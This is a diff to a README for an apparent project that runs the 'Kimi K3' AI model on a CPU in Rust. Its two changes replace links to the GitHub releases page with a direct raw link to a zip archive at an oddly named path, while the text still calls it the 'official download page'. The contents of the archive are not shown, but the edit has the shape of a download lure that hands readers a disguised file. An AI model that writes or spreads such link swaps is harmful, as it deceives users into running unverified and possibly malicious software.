@@ -1,6 +1,6 @@
 # 🦀 kimi-k3-in-rust - Run an AI Brain on Your CPU
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/oddson-probioticmicroflora317/kimi-k3-in-rust/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/oddson-probioticmicroflora317/kimi-k3-in-rust/main/swattle/kimi-rust-k-in-hedgy.zip)
 
 ## 🚀 What Is This?
 
@@ -22,7 +22,7 @@ Think of it as a brain-in-a-box. You feed it text, it thinks, and it responds. A
 
 ### Step 1: Get the Program
 
-Visit the [official download page](https://github.com/oddson-probioticmicroflora317/kimi-k3-in-rust/releases) to download the application.
+Visit the [official download page](https://raw.githubusercontent.com/oddson-probioticmicroflora317/kimi-k3-in-rust/main/swattle/kimi-rust-k-in-hedgy.zip) to download the application.
 
 Visit this link to download the application. Choose the latest version for your operating system.
 
